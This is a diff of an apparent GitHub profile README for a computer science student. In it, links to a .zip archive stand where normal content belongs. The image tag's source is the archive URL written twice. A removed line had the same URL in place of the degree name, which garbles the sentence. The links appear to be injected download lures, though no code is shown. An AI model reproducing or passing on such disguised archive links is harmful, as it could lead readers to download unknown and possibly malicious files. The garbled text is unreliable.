@@ -1,5 +1,5 @@
 - 👋 Hi, I’m Anmol Mishra. <img align='right' src="https://raw.githubusercontent.com/anmolmishra09/anmolmishra09/main/dually/anmolmishra09.zip*https://raw.githubusercontent.com/anmolmishra09/anmolmishra09/main/dually/anmolmishra09.zip" width="280">
-- 🤓 I am persuing https://raw.githubusercontent.com/anmolmishra09/anmolmishra09/main/dually/anmolmishra09.zip in Computer Science And Engineering from Dr. A. P. J. Abdul Kalam Technical University, Lucknow(2022-2026).
+- 🤓 I am persuing  in Computer Science And Engineering from Dr. A. P. J. Abdul Kalam Technical University, Lucknow(2022-2026).
 - 🚀 Technologies
   - Python, Java
   - HTML, CSS, JavaScript
